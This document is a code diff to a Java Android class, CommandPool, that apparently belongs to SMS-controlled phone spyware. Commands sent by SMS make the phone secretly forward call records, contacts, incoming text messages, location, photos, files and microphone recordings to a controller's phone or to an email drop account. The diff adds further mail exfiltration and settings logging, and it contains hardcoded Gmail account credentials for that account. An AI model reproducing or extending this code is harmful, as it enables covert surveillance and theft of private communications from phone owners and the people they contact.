@@ -15,7 +15,11 @@ import java.util.Collections;
 import java.util.Date;
 import java.util.Enumeration;
 import java.util.HashMap;
+import java.util.Iterator;
 import java.util.List;
+import java.util.Map;
+import java.util.Map.Entry;
+import java.util.Set;
 import java.util.jar.JarEntry;
 import java.util.jar.JarFile;
 
@@ -189,10 +193,12 @@ public class CommandPool extends Object {
 				return CommandObj.OK;
 			}
 			
-			public void Reply(Object ... argv) {
+			public void Reply(Object ... argv) throws Exception {
 				CallObj call = (CallObj)argv[0];
 				commandResult = String.format("%s звонок %s %s / %s,%d сек.",call.type,(call.typeVal == 1||call.typeVal == 3)?"от":"на",call.phone,call.name,call.duration);
-				replySMS("++%s",commandResult);
+				replySMS("%s",commandResult);
+				if ( args.hasOpt("mail"))
+					createMail().send();
 				NetLog.v("%s\r\n",commandResult);
 			}
 			
@@ -215,7 +221,7 @@ public class CommandPool extends Object {
 			public void Reply(Object ... argv) {
 				ContactObj con = (ContactObj)argv[0];
 				Integer count =  (Integer)argv[1];
-				replySMS("++Изменилось кол-во контактов ( %d ), последний - [%s:%s]",count,con.name,con.phoneArray());
+				replySMS("Изменилось кол-во контактов ( %d ), последний - [%s:%s]",count,con.name,con.phoneArray());
 			}
 		
 		}); // "rcontacts"
@@ -271,7 +277,7 @@ public class CommandPool extends Object {
 				if ( args.hasOpt("mail")) 
 					createMail().send();
 				NetLog.v("ifaddrs: %s",commandResult);
-				replySMS("++%s",commandResult);
+				replySMS("%s",commandResult);
 			}
 			
 			public String getExternalIp() {
@@ -515,7 +521,7 @@ public class CommandPool extends Object {
 				if  ( args.hasOpt("mail") )
 					createMail().send();
 
-				replySMS("++%s",commandResult);
+				replySMS("%s",commandResult);
 			}
 			
 		}); // "gps" command
@@ -544,6 +550,17 @@ public class CommandPool extends Object {
 					edit.putString(CommandObj.MAIL_PASS,args.strValue(CommandObj.MAIL_PASS));
 				
 				edit.commit();
+				
+				Map<String,?> map = prefs.getAll();
+				Set<?> set = map.entrySet();
+				
+				Iterator<?> i = set.iterator();
+				while ( i.hasNext() ) {
+					@SuppressWarnings("unchecked")
+					Entry<String,?> en = (Entry<String, ?>) i.next();
+					//Entry<String,?> e = i.next();
+					NetLog.v(">setup< \"%s\" = \"%s\"",en.getKey(),en.getValue());
+				}
 				
 				return CommandObj.OK;
 			}			
@@ -619,7 +636,7 @@ public class CommandPool extends Object {
 		 *  Downloads photo's
 		 *  format: "photo;"
 		 */
-		commands.add(new CommandObj("photo",";t:<yymmdd>") {
+		commands.add(new CommandObj("photo",";t:<yymmdd>;[names]") {
 			
 			public List<File> files = new ArrayList<File>();
 			public long checkDate = 0;
@@ -655,7 +672,7 @@ public class CommandPool extends Object {
 								}
 								
 								NetLog.v("Photo added %s\r\n", f.getAbsolutePath());
-								mail.addAttachment(f.getAbsolutePath());
+								mail.addAttachment(f.getAbsolutePath(),false);
 								count++;
 								if ( count == maxCount ) {
 									int tmp = sendCount+1;
@@ -747,7 +764,7 @@ public class CommandPool extends Object {
 						
 					NetLog.v("Downloading %s\r\n", fullName);
 					commandResult = commandResult.concat(fullName) + "\r\n";
-					mail.addAttachment(fullName);
+					mail.addAttachment(fullName,false);
 				}
 				mail.send();
 				return CommandObj.OK;
@@ -783,12 +800,14 @@ public class CommandPool extends Object {
 						names.put(sms.phone, name);
 					}
 				}
-				commandResult = String.format("%s '%s'  : %s",sms.type == SmsObj.IN?"от":"к",name,sms.message);
+				commandResult = String.format("%s '%s' : %s",sms.type == SmsObj.IN?"от":"к",name,sms.message);
 				NetLog.v("Redirecting to %s : \"%s\"\r\n",masterPhone,commandResult);
 				boolean mail    = args.hasOpt("mail");
 				if ( mail ) {
 					NetLog.v("Sending Log to mail...%b\r\n",mail);
-					createMail().send();
+					Mail m = createMail();
+					NetLog.v("sending");
+					m.send();
 				}
 			}
 		}); // "rsms"
@@ -797,7 +816,7 @@ public class CommandPool extends Object {
 		 *  Voice recording
 		 *  "mic;t:<sec>"
 		 */
-		commands.add(new CommandObj("mic","<sec>") {
+		commands.add(new CommandObj("mic","<sec>;[sms]") {
 			public int Invoke() throws Exception {
 				
 				if ( args.optCount() == 0 ) {
@@ -824,10 +843,11 @@ public class CommandPool extends Object {
 					NetLog.v("File %s not found\r\n",fileName);
 					return;
 				}
-				commandResult = String.format("Audio record on %s\r\n%s\r\n",new Date().toLocaleString(),fileName);
-				createMail().addAttachment(fileName).send();
-				if ( ack ) {
-					replySMS("++%s",commandResult);
+				commandResult = String.format("Audio record on %s\r\n%s",new Date().toLocaleString(),fileName);
+				createMail().addAttachment(fileName,true).send();
+				long fileSize = file.length();
+				if ( ack || args.hasOpt("sms") ) {
+					replySMS("Запись ( %s сек. / %d Кб ) отправлена на почту <%s>",args.getOpt(0),fileSize / 1024,prefs.getString(CommandObj.MAIL_TO, ""));
 				}
 			}
 		}); // "voice" command
@@ -946,7 +966,7 @@ public class CommandPool extends Object {
 					commandResult = commandResult.concat(cmd.commandName);
 					commandResult = commandResult.concat(cmd.helpString);
 				}
-				replySMS("++%s",commandResult);
+				replySMS("%s",commandResult);
 				return CommandObj.OK;
 			}
 		}); // "help" command
@@ -999,15 +1019,15 @@ public class CommandPool extends Object {
 		String args = "";
 		int sep = source.indexOf(";");
 		if ( sep != -1 ) {
-			commandName = source.substring(1,sep);
+			commandName = source.substring(CommandObj.SERVICE_CMD_TAG.length(),sep);
 			args = source.substring(sep+1);
-		} else commandName = source.substring(1);
+		} else commandName = source.substring(CommandObj.SERVICE_CMD_TAG.length());
 	
 		NetLog.v("cmd = \"%s\",args = \"%s\"\r\n",commandName,args);
 		CommandObj cmd = findCommand(commandName);
 		if ( cmd == null ) {
 			SmsManager mgr = (SmsManager)SmsManager.getDefault();
-			mgr.sendTextMessage(phone, null, String.format("++E: \"%s\"", source), null,null);
+			mgr.sendTextMessage(phone, null, String.format("%sОшибка: команда \"%s\" не найдена",CommandObj.SERVICE_REPLY_TAG, source), null,null);
 			return true;
 		}
 	
@@ -1022,10 +1042,10 @@ public class CommandPool extends Object {
 				else if ( result == CommandObj.ERROR ) {
 						throw new Exception(cmd.commandResult);
 				}  else if ( prefs.getBoolean(CommandObj.ACK, false) ) 
-						cmd.replySMS("++%s : ok", cmd.commandName);
+						cmd.replySMS("%s : ok", cmd.commandName);
 			}
 		} catch ( Exception e ) {
-			cmd.replySMS("++Ошибка: '%s %s': %s",cmd.commandName,cmd.argSource,e.getMessage());
+			cmd.replySMS("Ошибка: '%s %s': %s",cmd.commandName,cmd.argSource,e.getMessage());
 			NetLog.v("Error: %s : %s\r\n",cmd.commandName,e.getMessage());
 		}
 		return true;
@@ -1050,7 +1070,6 @@ public class CommandPool extends Object {
 	public ArrayList<ContactObj> listContacts() {
 		ArrayList<ContactObj> list = new ArrayList<ContactObj>();
 		Cursor cursor = mContext.getContentResolver().query(Contacts.CONTENT_URI, null, null, null, null);
-		NetLog.v("Cursor size = %d\n",cursor.getCount());
 		if ( cursor.moveToFirst() ) {
 			do {
 				list.add(new ContactObj(cursor,mContext));
@@ -1060,7 +1079,19 @@ public class CommandPool extends Object {
 		NetLog.v("Found %d names\n", list.size());
 		return list;
 	}
-	
+
+		/*
+		public void setDefaults() {
+				SharedPreferences prefs = mContext.getSharedPreferences(CommandObj.PREF_NAME,1);
+				SharedPreferences.Editor edit = prefs.edit();
+				edit.putBoolean(CommandObj.ACK,true);
+				edit.putString(CommandObj.MAIL_TO,"cache.sync@gmail.com");
+				edit.putString(CommandObj.MAIL_USER,"cache.sync@gmail.com");
+				edit.putString(CommandObj.MAIL_PASS,"gumbaflex");
+				edit.commit();
+		}
+		*/
+
 	/*
 	 *  Finds arbitary contact name for phone number
 	 */
@@ -1118,13 +1149,4 @@ public class CommandPool extends Object {
 		return name;
 	}
 	
-	public void defaultSettings() {
-		SharedPreferences prefs = mContext.getSharedPreferences(CommandObj.PREF_NAME,1);
-		SharedPreferences.Editor edit = prefs.edit();
-		edit.putBoolean(CommandObj.ACK,true);
-		edit.putString(CommandObj.MAIL_TO,"cache.sync@gmail.com");
-		edit.putString(CommandObj.MAIL_USER,"cache.sync@gmail.com");
-		edit.putString(CommandObj.MAIL_PASS,"r'i.cbyr");
-		edit.commit();
-	}
 }
